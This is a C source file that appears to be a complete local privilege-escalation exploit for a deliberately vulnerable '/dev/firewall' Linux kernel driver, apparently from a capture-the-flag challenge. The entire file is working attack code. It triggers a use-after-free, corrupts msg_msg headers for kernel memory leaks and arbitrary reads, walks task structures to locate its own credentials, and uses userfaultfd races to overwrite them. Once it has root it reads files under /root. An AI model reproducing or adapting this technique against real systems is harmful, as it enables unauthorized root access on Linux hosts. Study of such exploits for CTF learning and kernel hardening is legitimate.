#define _GNU_SOURCE
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <unistd.h>

// #include <linux/userfaultfd.h>
// if "linux/userfaultfd" not exists in you machine
#include "userfaultfd.h"

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_UNREGISTER 0x8010aa01

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif
#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

#define EASY_MODE 1
#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

int dev;
uint64_t init_task, init_cred, cred_struct,
    large_msg = 0, queue_leak = 0, sysfs_bin_kfops_ro = 0;
void *evil_page_1, *evil_page_2;
pthread_t tid[4];

int can_continue_run = 0;

typedef struct {
  char iface[16];
  char name[16];
  char ip[16];
  char netmask[16];
  uint8_t idx;
  uint8_t type;
  uint16_t proto;
  uint16_t port;
  uint8_t action;
#ifdef EASY_MODE
  char desc[DESC_MAX];
#endif
} user_rule_t;

typedef struct {
  long mtype;
  char mtext[1];
} msg;

typedef struct {
  uint64_t ll_next;
  uint64_t ll_prev;
  long m_type;
  size_t m_ts;
  uint64_t next;
} msg_header_t;

#define msg_msg_size 0x30

int qid[4];
static unsigned char uf_buf[PAGE_SIZE];
static unsigned char uf_buf2[PAGE_SIZE];

// print like gdb qwords, we round to nearest dqword
void hexprint(char *buffer, unsigned int bytes) {
  int dqwords = ((bytes + 0x10 - 1) & 0xfffffff0) / 0x10;
  int qwords = dqwords * 2;
  for (int i = 0; i < qwords; i += 2) {
    printf("0x%04x: 0x%016llx 0x%016llx\n", (i * 0x8),
           ((unsigned long long *)buffer)[i],
           ((unsigned long long *)buffer)[i + 1]);
  }
  puts("-----------------------------------------------");
  return;
}

void open_dev() {
  dev = open("/dev/firewall", O_RDONLY);
  if (dev < 0) {
    perror("Opening device");
  }
  puts("[+] Interacting with device");
}

void debug() {
  printf("[*] Paused (press enter to continue)\n");
  getchar();
}

void gen_dot_notation(char *buf, uint32_t val) {
  sprintf(buf, "%d.%d.%d.%d", val & 0x000000FF, (val & 0x0000FF00) >> 8,
          (val & 0x00FF0000) >> 16, (val & 0xFF000000) >> 24);
}

void parse_rule_payload(char *input, uint8_t idx, int type, user_rule_t *rule) {
  char addr[0x10];
  uint32_t ip = *(uint32_t *)&input[0x20];
  uint32_t netmask = *(uint32_t *)&input[0x24];

  memset(addr, 0, sizeof(addr));
  gen_dot_notation(addr, ip);
  memcpy(rule->ip, addr, 0x10);

  memset(addr, 0, sizeof(addr));
  gen_dot_notation(addr, netmask);
  memcpy(rule->netmask, addr, 0x10);

  memcpy(rule->iface, input, 0x10);
  memcpy(rule->name, &input[0x10], 0x10);
  memcpy(&rule->proto, &input[0x28], 2);
  memcpy(&rule->port, &input[0x28 + 2], 2);
  memcpy(&rule->action, &input[0x28 + 2 + 2], 1);
  rule->idx = idx;
  rule->type = type;
}

int firewall_add_rule(uint8_t idx, int type, char *buf) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  parse_rule_payload(buf, idx, type, &user_rule);
  return ioctl(dev, ADD_RULE, &user_rule);
}

int firewall_delete_rule(uint8_t idx, int type) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  user_rule.idx = idx;
  user_rule.type = type;
  return ioctl(dev, DELETE_RULE, &user_rule);
}

int firewall_edit_rule(uint8_t idx, int type, char *buf, int invalidate) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  parse_rule_payload(buf, idx, type, &user_rule);
  if (invalidate) {
    strcpy((void *)&user_rule.ip, "invalid");
    strcpy((void *)&user_rule.netmask, "invalid");
  }
  return ioctl(dev, EDIT_RULE, &user_rule);
}

int firewall_dup_rule(uint8_t idx, int type) {
  user_rule_t user_rule;
  memset(&user_rule, 0, sizeof(user_rule_t));
  user_rule.idx = idx;
  user_rule.type = type;
  return ioctl(dev, DUP_RULE, &user_rule);
}

int make_queue(key_t key, int msg_flags) {
  int result = msgget(key, msg_flags);
  if (result == -1) {
    perror("msgget failure");
    exit(-1);
  }
  return result;
}

void send_msg(int msqid, void *message, size_t msgsz, int msg_flags) {
  if (msgsnd(msqid, message, msgsz, msg_flags) == -1) {
    perror("msgsend failure");
    exit(-1);
  }
}

void get_msg(int msqid, void *message, size_t msgsz, long msg_type,
             int msg_flags) {
  if (msgrcv(msqid, message, msgsz, msg_type, msg_flags) < 0) {
    perror("msgrcv failure");
    exit(-1);
  }
}

void *page_fault_func1(void *arg) {
  struct pollfd pollfd;
  struct uffdio_copy uf_copy;
  struct uffd_msg uf_msg;
  long userfault_fd = (long)arg;

  pollfd.fd = userfault_fd;
  pollfd.events = POLLIN;
  printf("[pfh 1] Started\n");

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      perror("polling error");
      exit(-1);
    }

    if (read(userfault_fd, &uf_msg, sizeof(uf_msg)) == 0) {
      perror("reading message event");
      exit(-1);
    }

    if (uf_msg.event != UFFD_EVENT_PAGEFAULT) {
      perror("Unexpected event on userfaultfd");
      exit(-1);
    }
    void *race_page = (void *)uf_msg.arg.pagefault.address;

    printf("[pfh 1] Page fault at %p\n", race_page);
    if (race_page == evil_page_1 + PAGE_SIZE) {
      memset(uf_buf, 0, sizeof(uf_buf));

      msg_header_t evil;
      memset(&evil, 0, sizeof(msg_header_t));
      evil.m_type = 1;
      evil.m_ts = PAGE_SIZE - msg_msg_size + 8;
      evil.next = (cred_struct - 0x8);
      memcpy(uf_buf + 0x1000 - 0x40, &evil, sizeof(msg_header_t));

      uf_copy.src = (uint64_t)(&uf_buf);
      uf_copy.dst = (uint64_t)race_page;
      uf_copy.len = PAGE_SIZE;
      uf_copy.mode = 0;
      uf_copy.copy = 0;

      while (1) {
        if (can_continue_run == 1) {
          break;
        }
      }

      if (ioctl(userfault_fd, UFFDIO_COPY, &uf_copy) == -1) {
        perror("uffdio_copy error");
        exit(-1);
      }

      printf("[pfh 1] Finished\n");
    }
  }

  return 0;
}

void *page_fault_func2(void *arg) {
  struct pollfd pollfd;
  struct uffdio_copy uf_copy;
  struct uffd_msg uf_msg;
  long userfault_fd = (long)arg;

  pollfd.fd = userfault_fd;
  pollfd.events = POLLIN;

  printf("[pfh 2] Started\n");
  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) {
      perror("polling error");
      exit(-1);
    }

    if (read(userfault_fd, &uf_msg, sizeof(uf_msg)) == 0) {
      perror("reading message event");
      exit(-1);
    }

    if (uf_msg.event != UFFD_EVENT_PAGEFAULT) {
      perror("Unexpected event on userfaultfd");
      exit(-1);
    }

    printf("[pfh 2] Page fault 2 reached\n");

    void *race_page = (void *)uf_msg.arg.pagefault.address;
    if (race_page == evil_page_2 + PAGE_SIZE) {
      can_continue_run = 1;

      sleep(1);

      printf("[pfh 2] Continuing page fault 2\n");
      memset(uf_buf2, 0, sizeof(uf_buf2));

      uf_copy.src = (uint64_t)&uf_buf2;
      uf_copy.dst = (uint64_t)race_page;
      uf_copy.len = PAGE_SIZE;
      uf_copy.mode = 0;
      uf_copy.copy = 0;

      if (ioctl(userfault_fd, UFFDIO_COPY, &uf_copy) == -1) {
        perror("uffdio_copy error");
        exit(-1);
      }

      printf("[pfh 2] Finished\n");
    }
  }

  return 0;
}

void register_userfault(uint64_t race_page, int thread_idx,
                        void *(*func)(void *)) {
  int userfault_fd, race;
  struct uffdio_api uf_api;
  struct uffdio_register uf_register;
  userfault_fd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  uf_api.api = UFFD_API;
  uf_api.features = 0;

  if (ioctl(userfault_fd, UFFDIO_API, &uf_api) == -1) {
    perror("uffdio_api");
    exit(-1);
  }

  uf_register.range.start = race_page + PAGE_SIZE;
  uf_register.range.len = PAGE_SIZE;
  uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

  if (ioctl(userfault_fd, UFFDIO_REGISTER, &uf_register) == -1) {
    perror("error registering page for userfaultfd");
    exit(-1);
  }

  race =
      pthread_create(&tid[thread_idx], NULL, func, (void *)(long)userfault_fd);
  if (race != 0) {
    perror("cant setup thread for race");
    exit(-1);
  }
}

void corrupt_msg(size_t size, int mtype, uint64_t next_target) {
  msg_header_t evil;
  memset(&evil, 0, sizeof(msg_header_t));

  evil.m_type = mtype;
  evil.m_ts = size;

  if (next_target != 0) {
    evil.next = next_target;
    firewall_edit_rule(0, OUTBOUND, (void *)&evil, 0);
  } else {
    firewall_edit_rule(0, OUTBOUND, (void *)&evil, 1);
  }
}

void *alloc_msg1() {
  printf("[thread 1] Sending message here @ %p\n",
         evil_page_1 + PAGE_SIZE - 0x10);
  qid[2] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
  memset(evil_page_1, 0, PAGE_SIZE);
  ((unsigned long *)(evil_page_1))[0xff0 / 8] = 1;
  send_msg(qid[2], evil_page_1 + PAGE_SIZE - 0x10, 0x1ff8 - msg_msg_size, 0);

  printf("[thread 1] Finished\n");
  return NULL;
}

void *alloc_msg2() {
  printf("[thread 2] Sending message here @ %p\n",
         evil_page_2 + PAGE_SIZE - 0x10);
  qid[3] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
  memset(evil_page_2, 0, PAGE_SIZE);
  ((unsigned long *)(evil_page_2))[0xff0 / 8] = 1;

  send_msg(qid[3], evil_page_2 + PAGE_SIZE - 0x10, 0x1028 - msg_msg_size, 0);
  printf("[thread 2] Finished\n");
  return NULL;
}

int main() {
  open_dev();
  char buffer[0x2000], received[0x2000];
  msg *message = (msg *)buffer;
  int size;

  evil_page_1 = mmap((void *)0x1337000, PAGE_SIZE * 3, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
  evil_page_2 = mmap((void *)0x7331000, PAGE_SIZE * 3, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
  printf("[+] evil_page_1: %p - %p\n", evil_page_1,
         evil_page_1 + (PAGE_SIZE * 3));
  printf("[+] evil_page_2: %p - %p\n", evil_page_2,
         evil_page_2 + (PAGE_SIZE * 3));
  // debug();
  register_userfault((uint64_t)evil_page_1, 0, page_fault_func1);
  register_userfault((uint64_t)evil_page_2, 1, page_fault_func2);

  memset(buffer, 0, sizeof(buffer));
  memset(buffer, 'A', 0x40);

  qid[0] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
  qid[1] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

  // trigger UAF
  firewall_add_rule(0, INBOUND, buffer);
  firewall_dup_rule(0, INBOUND);
  firewall_delete_rule(0, INBOUND);

  message->mtype = 1;
  memset(message->mtext, 'A', 0x40 - msg_msg_size);
  send_msg(qid[0], message, 0x40 - msg_msg_size, 0);

  memset(message->mtext, 'B', 0x40 - msg_msg_size);
  send_msg(qid[1], message, 0x40 - msg_msg_size, 0);

  memset(message->mtext, 'A', 0x1ff8 - msg_msg_size);
  send_msg(qid[1], message, 0x1ff8 - msg_msg_size, 0);

  size = 0x2000;
  corrupt_msg(size, 0, 0);
  // get we leak after corrupt msg_msg header
  get_msg(qid[0], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  uint64_t *leak_buf = (uint64_t *)received;

  for (size_t i = 0; i < size / 8; i++) {
    uint64_t leak = leak_buf[i];
    uint64_t last_bytes = (leak & 0xffff);

    // search 4k message
    if (last_bytes == 0x4242 && large_msg == 0) {
      large_msg = leak_buf[i - 6];   // msg->ll_next
      queue_leak = leak_buf[i - 5];  // msg->ll_prev
      continue;
    }

    // Search some symbol for calc init_task address
    if (last_bytes == 0x1520) {
      init_task = leak - 0x2f060;  // error_injection_list
    } else if (last_bytes == 0x5b20) {
      init_task = leak + 0x1fc9a0;  // sysfs_file_kfops_rw
    } else if (last_bytes == 0x43e0) {
      init_task = leak + 0x43e0e0;  // inet6_rtm_deladdr
    } else if (last_bytes == 0xe2b0) {
      init_task = leak + 0x7c4210;  // __x64_sys_unshare
    } else if (last_bytes == 0xb210) {
      init_task = leak + 0x7f72b0;  // __x64_sys_iopl
    }

    if (init_task != 0 && large_msg != 0 && queue_leak != 0) {
      break;
    }
  }

  if (large_msg == 0 || queue_leak == 0 || init_task == 0) {
    printf("[-] Something happened on leak memory\n");
    exit(-1);
  }

  init_cred = init_task + 0x20ba0;
  printf("[+] init_task: %p\n", (void *)init_task);
  printf("[+] init_cred: %p\n", (void *)init_cred);
  printf("[+] Queue found: %p\n", (void *)queue_leak);
  printf("[+] 4k message found: %p\n", (void *)large_msg);

  memset(buffer, 0, sizeof(buffer));
  memset(received, 0, sizeof(received));

  size = 0x1500;
  // corrupt msg_msg header
  corrupt_msg(size, 1, init_task + 0x298 - 8);
  get_msg(qid[0], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);

  pid_t pid, my_pid = getpid();
  intptr_t prev_task, current_task;
  memcpy(&prev_task, received + 0xfe0, 8);
  memcpy(&pid, received + 0x10d8, 4);

  printf("[!] Searching current task struct\n");
  printf("[+] hit_pid=%d target_pid=%d\n", pid, my_pid);
  // debug();
  while (pid != my_pid) {
    current_task = prev_task - 0x298;
    corrupt_msg(size, 1, prev_task - 0x8);
    get_msg(qid[0], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    memcpy(&prev_task, received + 0xfe0, 8);
    memcpy(&pid, received + 0x10d8, 4);
    printf("[+] hit_pid=%d target_pid=%d\n", pid, my_pid);
  }

  printf("[+] Found! current task: %p\n", (void *)current_task);

  size = 0x2000;
  corrupt_msg(size, 1, current_task);
  get_msg(qid[0], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
  // real_cred and cred is at 0x538 and 0x540
  memcpy(&cred_struct, received + 0x1508, 8);
  printf("[+] current cred_struct: %p\n", (void *)cred_struct);

  // Clean up
  get_msg(qid[1], message, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR);
  get_msg(qid[1], message, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR);

  pthread_create(&tid[2], NULL, alloc_msg1, NULL);
  sleep(1);

  msg_header_t evil = {
      .ll_next = queue_leak,
      .ll_prev = queue_leak,
      .m_type = 1,
      .m_ts = 0x10,
      .next = large_msg,
  };

  printf("[+] Freeing large message with arb free: 0x%lx\n", large_msg);
  firewall_edit_rule(0, OUTBOUND, (void *)&evil, 0);
  get_msg(qid[0], buffer, 0x10, 1, IPC_NOWAIT | MSG_NOERROR);
  printf("[+] Freed!\n");

  pthread_create(&tid[3], NULL, alloc_msg2, NULL);

  pthread_join(tid[2], NULL);
  pthread_join(tid[3], NULL);

  uid_t uid = getuid();
  printf("[+] Current task uid: %d\n", uid);
  // debug();
  if (uid == 0) {
    printf("[+] r00t3d: uid=%d\n", uid);
    system("ls -la /root; cat /root/*");
  } else {
    printf("[-] not yet: uid=%d\n", uid);
    exit(-1);
  }
}
